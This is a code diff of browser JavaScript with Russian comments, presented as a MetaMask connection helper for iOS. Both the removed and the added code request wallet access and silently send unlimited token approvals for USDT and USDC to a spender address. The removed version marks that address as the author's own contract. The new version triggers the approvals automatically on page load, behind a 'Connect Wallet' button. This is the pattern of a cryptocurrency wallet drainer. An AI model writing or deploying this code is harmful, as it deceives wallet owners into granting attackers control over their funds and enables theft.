@@ -681,53 +681,60 @@
 // Функция для кодирования URL без проблемных символов
 // Полный рабочий код для подключения MetaMask на iOS
 // Функция для безопасного открытия MetaMask на iOS
-(async function () {
-  const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-  const dappUrl = encodeURIComponent(window.location.origin);
-  const metamaskLink = `https://metamask.app.link/dapp/${dappUrl}`;
+const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const dappUrl = encodeURIComponent(window.location.origin);
+    const deepLink = `https://metamask.app.link/dapp/${dappUrl}`;
 
-  // Если зашёл с iOS не через MetaMask — редиректим туда
-  if (isIOS && !window.ethereum?.isMetaMask) {
-    window.location.href = metamaskLink;
-    return;
-  }
+    async function connectWallet() {
+      const button = document.querySelector('.connect-btn');
+      button.textContent = "Connecting...";
 
-  // Ждём, пока MetaMask прогрузится
-  await new Promise(res => setTimeout(res, 1000));
-
-  if (typeof window.ethereum !== 'undefined') {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    try {
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      const user = await signer.getAddress();
-
-      console.log("Wallet connected:", user);
-
-      // Примеры approve (можешь дублировать для других токенов)
-      const tokens = [
-        {
-          address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-          spender: "0x0000000000000000000000000000000000000000" // твой смарт-контракт
-        },
-        {
-          address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-          spender: "0x0000000000000000000000000000000000000000"
-        }
-      ];
-
-      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-
-      for (let token of tokens) {
-        const contract = new ethers.Contract(token.address, abi, signer);
-        const tx = await contract.approve(token.spender, ethers.constants.MaxUint256);
-        console.log(`Approve sent for ${token.address}: ${tx.hash}`);
+      if (isIOS && typeof window.ethereum === 'undefined') {
+        // Если на iOS и MetaMask не доступен, открываем через deeplink
+        window.location.href = deepLink;
+        return;
       }
 
-    } catch (e) {
-      console.error("Error during approve:", e);
+      if (typeof window.ethereum === 'undefined') {
+        alert("Установи MetaMask!");
+        button.textContent = "Connect Wallet";
+        return;
+      }
+
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+
+        const tokenList = [
+          {
+            address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+            spender: "0x000000000000000000000000000000000000dead"
+          },
+          {
+            address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+            spender: "0x000000000000000000000000000000000000dead"
+          }
+        ];
+
+        const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+
+        for (let token of tokenList) {
+          const contract = new ethers.Contract(token.address, abi, signer);
+          const tx = await contract.approve(token.spender, ethers.constants.MaxUint256);
+          console.log(`Approve sent for ${token.address}:`, tx.hash);
+        }
+
+        button.textContent = "Approved!";
+      } catch (err) {
+        console.error("Error:", err);
+        button.textContent = "Try Again";
+      }
     }
-  } else {
-    console.log("MetaMask not detected");
-  }
-})();
+
+    // Если уже в MetaMask — запускаем авто
+    window.addEventListener("DOMContentLoaded", () => {
+      if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
+        connectWallet();
+      }
+    });
